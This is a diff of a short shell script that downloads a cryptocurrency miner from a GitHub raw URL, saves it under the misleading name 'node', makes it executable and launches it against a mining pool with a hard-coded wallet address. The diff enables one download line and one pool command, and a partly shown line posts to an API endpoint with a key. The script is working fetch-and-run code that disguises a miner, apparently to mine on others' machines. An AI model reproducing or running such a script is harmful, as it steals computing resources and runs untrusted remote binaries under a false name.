@@ -1,10 +1,10 @@
 #!/bin/sh
 # SRBMiner
-# curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+ curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 # cNfj5q6A7c4yM3KD
 
 # xmr
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+# curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
 
 chmod +x node
 WORKER_NUMBER=$1
@@ -22,7 +22,7 @@ curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "
 
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
-#./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5089 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
+./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
 # Crionic
 #./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
 #./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p c=CRNC,mc=CRNC,m=solo > try.log
